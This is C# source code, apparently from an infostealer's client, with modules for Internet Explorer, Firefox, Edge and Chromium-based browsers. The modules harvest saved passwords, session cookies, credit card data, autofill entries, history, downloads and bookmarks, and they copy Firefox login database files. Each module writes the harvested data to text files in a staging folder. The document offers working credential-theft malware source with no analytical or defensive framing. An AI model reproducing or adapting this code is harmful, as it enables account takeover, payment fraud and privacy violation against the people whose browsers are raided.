using System;
using System.Collections.Generic;
using System.IO;
using Client.Modules.Passwords.Helpers;
using Client.Modules.Passwords.Targets.Browsers.Chromium;

namespace Client.Modules.Passwords.Targets.Browsers.Internet_Explorer
{
	internal sealed class Recovery
	{
		public static void Run(string sSavePath)
		{
			List<Password> list = cPasswords.Get();
			if (list.Count != 0)
			{
				Directory.CreateDirectory(sSavePath + "\\InternetExplorer");
				cBrowserUtils.WritePasswords(list, sSavePath + "\\InternetExplorer\\Passwords.txt");
			}
		}
	}
}
namespace Client.Modules.Passwords.Targets.Browsers.Firefox
{
	internal sealed class Recovery
	{
		public static void Run(string sSavePath)
		{
			string[] sGeckoBrowserPaths = Paths.sGeckoBrowserPaths;
			foreach (string text in sGeckoBrowserPaths)
			{
				try
				{
					string name = new DirectoryInfo(text).Name;
					string text2 = sSavePath + "\\" + name;
					if (Directory.Exists(Paths.appdata + text + "\\Profiles"))
					{
						Directory.CreateDirectory(text2);
						List<Bookmark> bBookmarks = cBookmarks.Get(Paths.appdata + text);
						List<Cookie> list = cCookies.Get(Paths.appdata + text);
						List<Site> sHistory = cHistory.Get(Paths.appdata + text);
						cBrowserUtils.WriteBookmarks(bBookmarks, text2 + "\\Bookmarks.txt");
						cBrowserUtils.WriteCookies(list, text2 + "\\Cookies.txt");
						cBrowserUtils.WriteHistory(sHistory, text2 + "\\History.txt");
						cLogins.GetDBFiles(Paths.appdata + text + "\\Profiles\\", text2);
					}
				}
				catch (Exception value)
				{
					Console.WriteLine(value);
				}
			}
		}
	}
}
namespace Client.Modules.Passwords.Targets.Browsers.Edge
{
	internal sealed class Recovery
	{
		public static void Run(string sSavePath)
		{
			string path = Paths.lappdata + Paths.EdgePath;
			if (!Directory.Exists(path))
			{
				return;
			}
			string text = sSavePath + "\\Edge";
			Directory.CreateDirectory(text);
			string[] directories = Directory.GetDirectories(path);
			foreach (string text2 in directories)
			{
				if (File.Exists(text2 + "\\Login Data"))
				{
					List<CreditCard> cCC = CreditCards.Get(text2 + "\\Web Data");
					List<AutoFill> aFills = Autofill.Get(text2 + "\\Web Data");
					List<Bookmark> bBookmarks = Bookmarks.Get(text2 + "\\Bookmarks");
					List<Password> pPasswords = Stealer.Get(text2 + "\\Login Data");
					List<Cookie> cCookies = Cookies.Get(text2 + "\\Cookies");
					List<Site> sHistory = History.Get(text2 + "\\History");
					cBrowserUtils.WriteCreditCards(cCC, text + "\\CreditCards.txt");
					cBrowserUtils.WriteAutoFill(aFills, text + "\\AutoFill.txt");
					cBrowserUtils.WriteBookmarks(bBookmarks, text + "\\Bookmarks.txt");
					cBrowserUtils.WritePasswords(pPasswords, text + "\\Passwords.txt");
					cBrowserUtils.WriteCookies(cCookies, text + "\\Cookies.txt");
					cBrowserUtils.WriteHistory(sHistory, text + "\\History.txt");
				}
			}
		}
	}
}
namespace Client.Modules.Passwords.Targets.Browsers.Chromium
{
	internal sealed class Recovery
	{
		public static void Run(string sSavePath)
		{
			if (!Directory.Exists(sSavePath))
			{
				Directory.CreateDirectory(sSavePath);
			}
			string[] sChromiumPswPaths = Paths.sChromiumPswPaths;
			foreach (string text in sChromiumPswPaths)
			{
				string path = ((!text.Contains("Opera Software")) ? (Paths.lappdata + text) : (Paths.appdata + text));
				if (Directory.Exists(path))
				{
					string[] directories = Directory.GetDirectories(path);
					foreach (string obj in directories)
					{
						string text2 = sSavePath + "\\" + Crypto.BrowserPathToAppName(text);
						Directory.CreateDirectory(text2);
						List<CreditCard> cCC = CreditCards.Get(obj + "\\Web Data");
						List<Password> pPasswords = Stealer.Get(obj + "\\Login Data");
						List<Cookie> cCookies = Cookies.Get(obj + "\\Cookies");
						List<Site> sHistory = History.Get(obj + "\\History");
						List<Site> sHistory2 = Downloads.Get(obj + "\\History");
						List<AutoFill> aFills = Autofill.Get(obj + "\\Web Data");
						List<Bookmark> bBookmarks = Bookmarks.Get(obj + "\\Bookmarks");
						cBrowserUtils.WriteCreditCards(cCC, text2 + "\\CreditCards.txt");
						cBrowserUtils.WritePasswords(pPasswords, text2 + "\\Passwords.txt");
						cBrowserUtils.WriteCookies(cCookies, text2 + "\\Cookies.txt");
						cBrowserUtils.WriteHistory(sHistory, text2 + "\\History.txt");
						cBrowserUtils.WriteHistory(sHistory2, text2 + "\\Downloads.txt");
						cBrowserUtils.WriteAutoFill(aFills, text2 + "\\AutoFill.txt");
						cBrowserUtils.WriteBookmarks(bBookmarks, text2 + "\\Bookmarks.txt");
					}
				}
			}
		}
	}
}
